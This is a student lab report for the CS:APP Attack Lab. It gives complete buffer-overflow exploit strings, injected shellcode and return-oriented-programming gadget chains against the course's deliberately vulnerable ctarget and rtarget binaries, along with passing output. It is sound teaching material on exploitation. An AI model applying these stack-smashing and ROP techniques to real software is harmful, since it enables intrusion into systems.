---
title: CS:APP - Attack Lab 实验报告
date: 2019-10-26T22:16:00+08:00

tags: [CS:APP, 汇编, 缓冲区溢出]
categories: [note]
featuredImage: https://hakula-1257872502.file.myqcloud.com/images/article-covers/csapp.webp
license: CC BY-NC-SA 4.0

hiddenFromHomePage: false
hiddenFromSearch: false
---

Introduction to Computer Systems I (H) @ Fudan University, fall 2019.

<!--more-->

## 实验简介

{{< admonition info 参见 >}}
[CS:APP3e, Bryant and O'Hallaron - CMU](http://csapp.cs.cmu.edu/3e/labs.html)
{{< /admonition >}}

### 附件说明

- `ctarget`：Level 1 ~ 3 的攻击目标，未开启栈溢出保护，可以自己写可执行代码。
- `rtarget`：Level 4 ~ 5 的攻击目标，开启了栈溢出保护，需要使用 ROP（Return-Oriented Programming）来实现注入。
- `hex2raw`：辅助工具，用于将十六进制数转换为对应字符（串）。
- `farm.c`：ROP 中 gadget 的来源。
- `cookie.txt`：记录了 `cookie` 的值，解题过程中会用到。

## 实验报告

### 准备工作

#### 0.1 反汇编 `ctarget` 和 `rtarget`

使用 objdump 反汇编 `ctarget` 和 `rtarget` 程序，并将输出重定向到 `ctarget.asm` 和 `rtarget.asm`。

```bash
objdump -d ctarget > ctarget.asm
objdump -d rtarget > rtarget.asm
```

#### 0.2 如何输入用于注入的字符串

用于注入的字符串中有很多不可见字符不能直接用键盘输入，因此这里需要借助本 Lab 提供的辅助工具 hex2raw 来实现这些不可见字符的输入。

##### 0.2.1 hex2raw 使用方法

- 输入文件 `exploit.txt` 的内容：以空格隔开的 2 位一组的十六进制数
- 输出文件 `exploit_raw.txt` 的内容：还原出的字符串

编辑输入文件 `exploit.txt`：

```bash
vim exploit.txt
```

```text
68 65 6c 6c 6f
```

使用 hex2raw 还原字符串：

```bash
./hex2raw < exploit.txt > exploit_raw.txt
```

查看输出文件 `exploit_raw.txt`：

```bash
cat exploit_raw.txt
```

```text
hello
```

##### 0.2.2 输入字符串

以 `ctarget` 程序为例：

```bash
./ctarget -q < exploit_raw.txt
```

输出信息：

```text
Cookie: 0x59b997fa
Type string:No exploit.  Getbuf returned 0x1
Normal return
```

### Level 1: Code Injection

#### 1.1 本关目标

执行函数 `touch1`。

#### 1.2 本关解答

`exploit.txt` 中的内容：

```text
c2 a9 20 32 30 31 39 20
43 6f 70 79 72 69 67 68
74 20 48 61 6b 75 6c 61
2c 20 43 43 20 42 59 2d
4e 43 2d 53 41 20 00 00
c0 17 40 00 00 00 00 00
```

#### 1.3 解题思路

输入一个长字符串，使函数 `test` 在调用函数 `getbuf` 时发生缓冲区溢出，利用溢出部分修改函数的返回地址，从而使函数 `getbuf` 不返回到函数 `test`，而是返回到目标函数 `touch1`。

#### 1.4 解题过程

##### 1.4.0 总览

讲义中给出了函数 `test` 和 `getbuf` 的源代码：

```c
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

```c
unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

在函数 `getbuf` 中，函数 `Gets` 将读取我们输入的字符串，并保存在缓冲区 `buf` 中。可见，这里存在缓冲区溢出漏洞。

##### 1.4.1 观察函数 `getbuf`

在 `ctarget.asm` 中找到函数 `getbuf` 对应的汇编语句：

```asm
00000000004017a8 <getbuf>:
  4017a8:   48 83 ec 28             sub    $0x28,%rsp
  4017ac:   48 89 e7                mov    %rsp,%rdi
  4017af:   e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:   b8 01 00 00 00          mov    $0x1,%eax
  4017b9:   48 83 c4 28             add    $0x28,%rsp
  4017bd:   c3                      retq
  4017be:   90                      nop
  4017bf:   90                      nop
```

`4017a8`: `sub $0x28,%rsp` 对应 C 语言代码中的 `char buf[BUFFER_SIZE]`，可见 `BUFFER_SIZE` 的值即为 `40`。

因此，当我们输入的字符串长度超过 40 时，就将造成缓冲区溢出。

##### 1.4.2 查看函数 `touch1` 的地址

在 `ctarget.asm` 中找到函数 `touch1` 对应的汇编语句：

```asm
00000000004017c0 <touch1>:
  ...
```

可见函数 `touch1` 的地址为 `0x4017c0`。

##### 1.4.3 ATTACK

函数 `getbuf` 在栈中没有保存寄存器，也没有其他局部变量。因此由栈帧的结构可知，当发生缓冲区溢出时，溢出部分将直接覆盖调用者栈帧中的返回地址。

构造用于注入的字符串：

1. 输入任意 40 个字符填满缓冲区；
2. 输入作为地址的 8 个字符导致溢出，溢出部分将返回地址修改为 `touch1` 的地址 `0x4017c0`。注意地址的字节顺序应当按照小端序（little endian），即低位字节保存在低地址，高位字节保存在高地址。

编辑输入文件 `exploit.txt`：

```text
c2 a9 20 32 30 31 39 20
43 6f 70 79 72 69 67 68
74 20 48 61 6b 75 6c 61
2c 20 43 43 20 42 59 2d
4e 43 2d 53 41 20 00 00
c0 17 40 00 00 00 00 00
```

在 `ctarget` 程序中输入该字符串：

```bash
cat exploit.txt | ./hex2raw | ./ctarget -q
```

输出信息：

```text
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:C2 A9 20 32 30 31 39 20 43 6F 70 79 72 69 67 68 74 20 48 61 6B 75 6C 61 2C 20 43 43 20 42 59 2D 4E 43 2D 53 41 20 00 00 C0 17 40 00 00 00 00 00
```

##### 1.4.4 运行结果

{{< image src="assets/level-1.webp" caption="Level 1 运行结果" width="100%" >}}

### Level 2: Code Injection

#### 2.1 本关目标

执行函数 `touch2`，并传入 `cookie` 的值作为参数 `val`。

#### 2.2 本关解答

`exploit.txt` 中的内容：

```text
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

#### 2.3 解题思路

同样，还是利用函数 `getbuf` 的缓冲区溢出漏洞。只是在返回前需要额外一步操作：将 `cookie` 的值传给 `%rdi` 寄存器（第 1 个参数）。我们可以自行构造汇编代码来实现这一点。

那么如何执行我们构造的代码呢？我们可以将这段代码放在缓冲区内，然后利用缓冲区溢出部分修改函数的返回地址，使函数 `getbuf` 返回到这段代码的起始地址。之后再写一段用于返回到目标函数 `touch2` 的返回语句即可。

#### 2.4 解题过程

##### 2.4.0 总览

讲义中给出了函数 `touch2` 的源代码：

```c
void touch2(unsigned val) {
    vlevel = 2;       /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

可见需要传入 `cookie` 的值作为参数 `val`。

##### 2.4.1 查看函数 `touch2` 的地址

在 `ctarget.asm` 中找到函数 `touch2` 对应的汇编语句：

```asm
00000000004017ec <touch2>:
  ...
```

可见函数 `touch2` 的地址为 `0x4017ec`。

##### 2.4.2 查看缓冲区的起始地址

使用 gdb 调试 `ctarget`。

```bash
gdb ctarget
```

```text
(gdb) set args -q
```

在函数 `getbuf` 的入口处设置一个断点。

```text
(gdb) b getbuf
```

运行，到断点处暂停，执行一步 `4017a8`: `sub $0x28,%rsp`，查看此时 `%rsp` 的值。

```text
(gdb) r
(gdb) ni
(gdb) p/x $rsp
```

输出信息：

```text
$1 = 0x5561dc78
```

可见此时 `%rsp` 的值为 `0x5561dc78`，这就是缓冲区的起始地址。

##### 2.4.3 构造汇编代码

这段汇编代码需要实现的功能：

1. 将 `cookie` 的值传给 `%rdi` 寄存器（第 1 个参数）；
2. 返回到目标函数 `touch2`。

其中 `cookie` 的值由附件 `cookie.txt` 给出，为 `0x59b997fa`，函数 `touch2` 的地址由 [2.4.1](#241-查看函数-touch2-的地址) 节可知为 `0x4017ec`。

由此构造汇编代码：

```asm
mov    $0x59b997fa,%rdi
push   $0x4017ec
ret
```

因为 `ret` 时将弹栈，并将弹出的值传给 `%rip`，这里 `push $0x4017ec` 的作用就是将函数 `touch2` 的地址先压入栈中。由于栈后进先出（LIFO）的特点，这样弹栈时这个地址就会被当作函数的返回地址。

##### 2.4.4 将汇编代码转换为机器码

将这段汇编代码保存在 `level2.s` 文件中。

使用 gcc 编译得到目标代码 `level2.o`：

```bash
gcc -c level2.s
```

使用 objdump 反汇编 `level2.o`：

```bash
objdump -d level2.o
```

输出信息：

```asm
level2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```

这样就得到了对应的机器码：

```text
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
```

##### 2.4.5 ATTACK

构造用于注入的字符串：

1. 输入这段机器码（13 个字符），其起始地址就是缓冲区的起始地址；
2. 输入任意 27 个字符填满缓冲区的剩余部分；
3. 输入作为地址的 8 个字符导致溢出，溢出部分将返回地址修改为缓冲区的起始地址 `5561dc78`。

编辑输入文件 `exploit.txt`：

```text
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

在 `ctarget` 程序中输入该字符串：

```bash
cat exploit.txt | ./hex2raw | ./ctarget -q
```

输出信息：

```text
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

##### 2.4.6 运行结果

{{< image src="assets/level-2.webp" caption="Level 2 运行结果" width="100%" >}}

### Level 3: Code Injection

#### 3.1 本关目标

执行函数 `touch3`，并传入表示 `cookie` 的值的字符串作为参数 `sval`。

#### 3.2 本关解答

`exploit.txt` 中的内容：

```text
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00
```

#### 3.3 解题思路

与 Level 2 类似，区别在于这次我们需要构造一个字符串，而不是直接传一个整数。需要注意字符串的保存位置。

#### 3.4 解题过程

##### 3.4.0 总览

讲义中给出了函数 `hexmatch` 和 `touch3` 的源代码：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

```c
void touch3(char *sval) {
    vlevel = 3;       /* Part of validation protocol */
    if (hexmatch(cookie,sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

可见需要传入表示 `cookie` 的值的字符串作为参数 `sval`。同时函数 `hexmatch` 的设计使得直接获取用于检验的字符串较为困难，因此我们需要自行构造这个字符串。

##### 3.4.1 查看函数 `touch3` 的地址

在 `ctarget.asm` 中找到函数 `touch3` 对应的汇编语句：

```asm
00000000004018fa <touch3>:
  ...
```

可见函数 `touch3` 的地址为 `0x4018fa`。

##### 3.4.2 构造表示 `cookie` 的值的字符串

已知 `cookie` 的值为 `0x59b997fa`，我是懒得去对照 ASCII 码表了，直接交给程序处理。编写代码如下：

```c
void raw2hex(char* raw_str) {
    int len = strlen(raw_str);
    printf("Output:");
    for (int i = 0; i < len; ++i)
        printf(" %x", raw_str[i]);
    printf(" 00\n");                        // add '\0' to the end
}
```

传入字符串 `59b997fa`（已去除 `0x` 前缀），输出结果：

```text
Output: 35 39 62 39 39 37 66 61 00
```

即为需要构造的字符串的十六进制数表示。

##### 3.4.3 字符串的保存位置

需注意，该字符串不能保存在函数 `getbuf` 的缓冲区中，即函数返回地址在栈中保存位置的下方。否则返回到函数 `touch3` 后，在进行字符串比较前，一系列压栈操作将使缓冲区里的内容被新写入的数据覆盖。如下所示：

```asm
00000000004018fa <touch3>:
  4018fa:   53                      push   %rbx
  ...
  401911:   e8 36 ff ff ff          callq  40184c <hexmatch>
```

```asm
000000000040184c <hexmatch>:
  40184c:   41 54                   push   %r12
  40184e:   55                      push   %rbp
  40184f:   53                      push   %rbx
  ...
```

因此，字符串应当保存在函数返回地址在栈中保存位置的上方，也就是函数 `test` 的栈帧中。方便起见，不妨保存在返回地址保存位置的下一个地址，即缓冲区的起始地址 `0x5561dc78` 加上偏移量 `48` 后得到的地址 `0x5561dca8`。

##### 3.4.4 构造汇编代码

这段汇编代码需要实现的功能：

1. 将这个字符串的地址传给 `%rdi` 寄存器（第 1 个参数）；
2. 返回到目标函数 `touch3`。

其中，字符串的地址由 [3.4.3](#343-字符串的保存位置) 节可知为 `0x5561dca8`，函数 `touch3` 的地址由 [3.4.1](#341-查看函数-touch3-的地址) 节可知为 `0x4018fa`。

类似 [2.4.3](#243-构造汇编代码) 节，构造汇编代码：

```asm
mov    $0x5561dca8,%rdi
push   $0x4018fa
ret
```

##### 3.4.5 将汇编代码转换为机器码

类似 [2.4.4](#244-将汇编代码转换为机器码) 节，得到对应的机器码：

```text
48 c7 c7 a8 dc 61 55
68 fa 18 40 00
c3
```

##### 3.4.6 ATTACK

构造用于注入的字符串：

1. 输入这段机器码（13 个字符）；
2. 输入任意 27 个字符填满缓冲区的剩余部分；
3. 输入作为地址的 8 个字符导致溢出，溢出部分将返回地址修改为缓冲区的起始地址 `5561dc78`；
4. 输入表示 `cookie` 的值的字符串。

编辑输入文件 `exploit.txt`：

```text
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00
```

在 `ctarget` 程序中输入该字符串：

```bash
cat exploit.txt | ./hex2raw | ./ctarget -q
```

输出信息：

```text
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

##### 3.4.7 运行结果

{{< image src="assets/level-3.webp" caption="Level 3 运行结果" width="100%" >}}

### Level 4: Return-Oriented Programming

#### 4.1 本关目标

同 Level 2。区别在于 `rtarget` 程序开启了地址随机化（Address Space Layout Randomization, ASLR）和栈不可执行机制（No-eXecute, NX），但同时也新增了辅助用的 gadget farm。这次我们需要进行 ROP 攻击，利用源程序已有的代码来构造我们需要的指令序列。

#### 4.2 本关解答

`exploit.txt` 中的内容：

```text
c2 a9 20 32 30 31 39 20
43 6f 70 79 72 69 67 68
74 20 48 61 6b 75 6c 61
2c 20 43 43 20 42 59 2d
4e 43 2d 53 41 20 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

#### 4.3 解题思路

同 [2.3](#23-解题思路) 节，目标是将 `cookie` 的值传给 `%rdi` 寄存器，并最终返回到目标函数 `touch2`。

由于没有指令可以将一个特定的立即数直接传给某个寄存器，这里我们可以将这个立即数先保存在栈中，然后利用 `popq` 指令弹栈传给某个寄存器，此后再利用 `movq`、`movl` 等指令在寄存器间互相传递。

为了使指令能够连成一个序列，我们需要每句指令后都紧接着一句 `ret` 指令（对应机器码 `c3`）。先提前将下一条指令的地址保存在栈中，然后利用 `ret` 指令弹栈传给 `%rip`，从而实现跳转。

需注意，由题目要求，只允许跳转到以下位置：

- 函数 `touch1`、`touch2`、`touch3` 的地址
- 注入代码的任意位置
- gadget farm 中的某一个 gadget（即 `start_farm` 和 `end_farm` 之间的地址）

#### 4.4 解题过程

##### 4.4.0 总览

原本的汇编代码：

```asm
mov    $0x59b997fa,%rdi
push   $0x4017ec
ret
```

我们逐句进行改写。

##### 4.4.1 第 1 句指令

```asm
mov    $0x59b997fa,%rdi
```

由 [4.3](#43-解题思路) 节的分析，我们可以将 `0x59b997fa` 先保存在栈中，然后利用 `popq` 指令弹栈传给某个寄存器，此后再利用 `movq`、`movl` 等指令传给 `%rdi` 寄存器。

###### 4.4.1.1 第 1 个 gadget

注意到 gadget farm 中函数 `getval_280` 对应的汇编语句：

```asm
00000000004019ca <getval_280>:
  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:   c3                      retq
```

其中机器码 `58 90 c3` 对应汇编指令：

```asm
popq   %rax
ret
```

该指令的地址为 `0x4019cc`。

###### 4.4.1.2 第 2 个 gadget

注意到 gadget farm 中函数 `addval_273` 对应的汇编语句：

```asm
00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq
```

其中机器码 `48 89 c7 c3` 对应汇编指令：

```asm
movq   %rax,%rdi
ret
```

该指令的地址为 `0x4019a2`。

###### 4.4.1.3 整合

于是可改写第 1 句指令为：

```asm
popq   %rax
ret
movq   %rax,%rdi
ret
```

在栈中需要保存的内容为：

```text
cc 19 40 00 00 00 00 00             /* popq   %rax                  */
fa 97 b9 59 00 00 00 00             /* the value of cookie          */
a2 19 40 00 00 00 00 00             /* movq   %rax,%rdi             */
```

分别对应：

1. 第 1 个 gadget 中指令的地址 `0x4019cc`
2. `cookie` 的值 `0x59b997fa`
3. 第 2 个 gadget 中指令的地址 `0x4019a2`

##### 4.4.2 第 2 ~ 3 句指令

```asm
push   $0x4017ec
ret
```

这次就不需要压栈了，直接将函数 `touch2` 的地址保存在栈中即可，上一条指令结尾的 `ret` 指令将使函数返回到目标函数 `touch2`。

在栈中需要保存的内容为：

```text
ec 17 40 00 00 00 00 00             /* the address of touch2        */
```

表示函数 `touch2` 的地址 `0x4017ec`。

##### 4.4.3 ATTACK

构造用于注入的字符串：

1. 输入任意 40 个字符填满缓冲区；
2. 输入由以上分析可知在栈中需要保存的内容。

编辑输入文件 `exploit.txt`：

```text
c2 a9 20 32 30 31 39 20
43 6f 70 79 72 69 67 68
74 20 48 61 6b 75 6c 61
2c 20 43 43 20 42 59 2d
4e 43 2d 53 41 20 00 00             /* 40 bytes of trash            */
cc 19 40 00 00 00 00 00             /* popq   %rax                  */
fa 97 b9 59 00 00 00 00             /* the value of cookie          */
a2 19 40 00 00 00 00 00             /* movq   %rax,%rdi             */
ec 17 40 00 00 00 00 00             /* the address of touch2        */
```

在 `rtarget` 程序中输入该字符串：

```bash
cat exploit.txt | ./hex2raw | ./rtarget -q
```

输出信息：

```text
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:C2 A9 20 32 30 31 39 20 43 6F 70 79 72 69 67 68 74 20 48 61 6B 75 6C 61 2C 20 43 43 20 42 59 2D 4E 43 2D 53 41 20 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

##### 4.4.4 运行结果

{{< image src="assets/level-4.webp" caption="Level 4 运行结果" width="100%" >}}

### Level 5: Return-Oriented Programming

#### 5.1 本关目标

同 Level 3。区别在于这次我们需要进行 ROP 攻击。

#### 5.2 本关解答

`exploit.txt` 中的内容：

```text
c2 a9 20 32 30 31 39 20
43 6f 70 79 72 69 67 68
74 20 48 61 6b 75 6c 61
2c 20 43 43 20 42 59 2d
4e 43 2d 53 41 20 00 00
cc 19 40 00 00 00 00 00
20 00 00 00 00 00 00 00
42 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00
```

#### 5.3 解题思路

同 [3.3](#33-解题思路) 节，目标是构造表示 `cookie` 的值的字符串，将其地址传给 `%rdi` 寄存器，并最终返回到目标函数 `touch3`。

解题思路整体类似 [4.3](#43-解题思路) 节。

需注意，由于 `rtarget` 程序开启了地址随机化，不能直接得到字符串的地址，因此需要利用 `movq`、`movl` 等指令将 `%rsp` 的值传给某个寄存器，以获得栈的起始地址。之后再为这个地址加上一个偏移量 `offset`，从而得到字符串的实际地址。

为了不影响指令间的跳转，字符串应当保存在所有栈中保存内容的最后。

#### 5.4 解题过程

##### 5.4.0 总览

原本的汇编代码：

```asm
mov    $0x5561dca8,%rdi
push   $0x4018fa
ret
```

我们逐句进行改写。

##### 5.4.1 第 1 句指令

```asm
mov    $0x5561dca8,%rdi
```

由 [5.3](#53-解题思路) 节的分析，我们不能直接得到字符串的地址，因此需要利用 `movq`、`movl` 等指令将 `%rsp` 的值传给某个寄存器。

当然，此时这个寄存器保存的值并不是字符串的地址。于是我们需要为这个地址加上一个偏移量 `offset`，从而得到字符串的实际地址。但字符串将保存在所有栈中保存内容的最后，因此 `offset` 的值我们最后才能得到。

###### 5.4.1.1 第 3 个 gadget

注意到 gadget farm 中函数 `addval_190` 对应的汇编语句：

```asm
0000000000401a03 <addval_190>:
  401a03:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
  401a09:   c3                      retq
```

其中机器码 `48 89 e0 c3` 对应汇编指令：

```asm
movq   %rsp,%rax
ret
```

该指令的地址为 `0x401a06`。

###### 5.4.1.2 第 2 个 gadget

由 [4.4.1.2](#4412-第-2-个-gadget) 节，第 2 个 gadget 中有汇编指令：

```asm
movq   %rax,%rdi
ret
```

该指令的地址为 `0x4019a2`。

###### 5.4.1.3 第 4 个 gadget

惊奇地注意到 gadget farm 中函数 `add_xy` 对应的汇编语句（竟然还有这种函数）：

```asm
00000000004019d6 <add_xy>:
  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:   c3                      retq
```

其对应汇编指令：

```asm
leaq   (%rdi,%rsi,1),%rax
ret
```

该指令的地址为 `0x4019d6`。

其作用是将 `%rdi` 和 `%rsi` 的值之和传给 `%rax` 寄存器。目前 `%rsp` 的值保存在 `%rdi` 寄存器中，因此我们需要想办法把偏移量 `offset` 的值传到 `%rsi` 寄存器，从而我们就能利用这个 gadget 中的指令得到字符串的实际地址。

类似 [4.4.1](#441-第-1-句指令) 节，我们可以将 `offset` 的值先保存在栈中，然后利用 `popq` 指令弹栈传给某个寄存器，此后再利用 `movq`、`movl` 等指令传到 `%rsi` 寄存器。

###### 5.4.1.4 第 1 个 gadget

由 [4.4.1.1](#4411-第-1-个-gadget) 节，第 1 个 gadget 中有汇编指令：

```asm
popq   %rax
ret
```

该指令的地址为 `0x4019cc`。

现在我们的目标就转化为利用 `movq`、`movl` 等指令将 `%rax` 的值传到 `%rsi` 寄存器。遗憾的是，gadget farm 中并不存在直接将 `%rax` 的值传给 `%rsi` 寄存器的汇编指令，因此需要进行多次传递。

###### 5.4.1.5 第 5 个 gadget

注意到 gadget farm 中函数 `addval_436` 对应的汇编语句：

```asm
0000000000401a11 <addval_436>:
  401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax
  401a17:   c3                      retq
```

其中机器码 `89 ce 90 90 c3` 对应汇编指令：

```asm
movl   %ecx,%esi
ret
```

该指令的地址为 `0x401a13`。

###### 5.4.1.6 第 6 个 gadget

注意到 gadget farm 中函数 `getval_159` 对应的汇编语句：

```asm
0000000000401a33 <getval_159>:
  401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax
  401a38:   c3                      retq
```

其中机器码 `89 d1 38 c9 c3` 对应汇编指令：

```asm
movl   %edx,%ecx
cmpb   %cl,%cl
ret
```

该指令的地址为 `0x401a34`。这里 `cmpb %cl,%cl` 相当于一条无用指令。

###### 5.4.1.7 第 7 个 gadget

注意到 gadget farm 中函数 `addval_487` 对应的汇编语句：

```asm
0000000000401a40 <addval_487>:
  401a40:   8d 87 89 c2 84 c0       lea    -0x3f7b3d77(%rdi),%eax
  401a46:   c3                      retq
```

其中机器码 `89 c2 84 c0 c3` 对应汇编指令：

```asm
movl   %eax,%edx
testb  %al,%al
ret
```

该指令的地址为 `0x401a42`。这里 `testb %al,%al` 相当于一条无用指令。

至此，我们可以将 `%rax` 的值传到 `%rsi` 寄存器了（`%eax`-> `%edx` -> `%ecx` -> `%esi`）。

###### 5.4.1.8 整合

于是可改写第 1 句指令为：

```asm
popq   %rax
ret
movl   %eax,%edx
testb  %al,%al
ret
movl   %edx,%ecx
cmpb   %cl,%cl
ret
movl   %ecx,%esi
ret

movq   %rsp,%rax
ret
movq   %rax,%rdi
ret

leaq   (%rdi,%rsi,1),%rax
ret
movq   %rax,%rdi
ret
```

在栈中需要保存的内容为：

```text
cc 19 40 00 00 00 00 00             /* popq   %rax                  */
ff 00 00 00 00 00 00 00             /* the value of offset          */
42 1a 40 00 00 00 00 00             /* movl   %eax,%edx             */
34 1a 40 00 00 00 00 00             /* movl   %edx,%ecx             */
13 1a 40 00 00 00 00 00             /* movl   %ecx,%esi             */
06 1a 40 00 00 00 00 00             /* movq   %rsp,%rax             */
a2 19 40 00 00 00 00 00             /* movq   %rax,%rdi             */
d6 19 40 00 00 00 00 00             /* leaq   (%rdi,%rsi,1),%rax    */
a2 19 40 00 00 00 00 00             /* movq   %rax,%rdi             */
```

分别对应：

1. 第 1 个 gadget 中指令的地址 `0x4019cc`
2. 偏移量 `offset` 的值（目前先用 `0xff` 占位）
3. 第 7 个 gadget 中指令的地址 `0x401a42`
4. 第 6 个 gadget 中指令的地址 `0x401a34`
5. 第 5 个 gadget 中指令的地址 `0x401a13`（`%rsi` 寄存器就位）
6. 第 3 个 gadget 中指令的地址 `0x401a06`
7. 第 2 个 gadget 中指令的地址 `0x4019a2`（`%rdi` 寄存器就位）
8. 第 4 个 gadget 中指令的地址 `0x4019d6`（得到字符串地址）
9. 第 2 个 gadget 中指令的地址 `0x4019a2`（传给 `%rdi` 寄存器）

##### 5.4.2 第 2 ~ 3 句指令

```asm
push   $0x4018fa
ret
```

同 [4.4.2](#442-第-2--3-句指令) 节，直接将函数 `touch3` 的地址保存在栈中即可，上一条指令结尾的 `ret` 指令将使函数返回到目标函数 `touch3`。

在栈中需要保存的内容为：

```text
fa 18 40 00 00 00 00 00             /* the address of touch3        */
```

表示函数 `touch3` 的地址 `0x4018fa`。

##### 5.4.3 确定偏移量的值

构造用于注入的字符串（初步）：

1. 输入任意 40 个字符填满缓冲区；
2. 输入由以上分析可知在栈中需要保存的内容；
3. 输入表示 `cookie` 的值的字符串。

```text
c2 a9 20 32 30 31 39 20
43 6f 70 79 72 69 67 68
74 20 48 61 6b 75 6c 61
2c 20 43 43 20 42 59 2d
4e 43 2d 53 41 20 00 00             /* 40 bytes of trash            */
cc 19 40 00 00 00 00 00             /* popq   %rax                  */
ff 00 00 00 00 00 00 00             /* the value of offset          */
42 1a 40 00 00 00 00 00             /* movl   %eax,%edx             */
34 1a 40 00 00 00 00 00             /* movl   %edx,%ecx             */
13 1a 40 00 00 00 00 00             /* movl   %ecx,%esi             */
06 1a 40 00 00 00 00 00             /* movq   %rsp,%rax             */
a2 19 40 00 00 00 00 00             /* movq   %rax,%rdi             */
d6 19 40 00 00 00 00 00             /* leaq   (%rdi,%rsi,1),%rax    */
a2 19 40 00 00 00 00 00             /* movq   %rax,%rdi             */
fa 18 40 00 00 00 00 00             /* the address of touch3        */
35 39 62 39 39 37 66 61             /* the value of string          */
00
```

可见，第 11 行**跳转完后**得到了 `%rsp` 的值（此时 `%rsp` 指向第 12 行），第 16 行是字符串的地址，因此偏移量 `offset` 的值为 `32`（即 `0x20`）。

将第 7 行的占位符修改为 `offset` 的实际值 `0x20`：

```text
...
20 00 00 00 00 00 00 00             /* the real value of offset     */
...
```

##### 5.4.4 ATTACK

编辑输入文件 `exploit.txt`：

```text
c2 a9 20 32 30 31 39 20
43 6f 70 79 72 69 67 68
74 20 48 61 6b 75 6c 61
2c 20 43 43 20 42 59 2d
4e 43 2d 53 41 20 00 00             /* 40 bytes of trash            */
cc 19 40 00 00 00 00 00             /* popq   %rax                  */
20 00 00 00 00 00 00 00             /* the real value of offset     */
42 1a 40 00 00 00 00 00             /* movl   %eax,%edx             */
34 1a 40 00 00 00 00 00             /* movl   %edx,%ecx             */
13 1a 40 00 00 00 00 00             /* movl   %ecx,%esi             */
06 1a 40 00 00 00 00 00             /* movq   %rsp,%rax             */
a2 19 40 00 00 00 00 00             /* movq   %rax,%rdi             */
d6 19 40 00 00 00 00 00             /* leaq   (%rdi,%rsi,1),%rax    */
a2 19 40 00 00 00 00 00             /* movq   %rax,%rdi             */
fa 18 40 00 00 00 00 00             /* the address of touch3        */
35 39 62 39 39 37 66 61             /* the value of string          */
00
```

在 `rtarget` 程序中输入该字符串：

```bash
cat exploit.txt | ./hex2raw | ./rtarget -q
```

输出信息：

```text
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
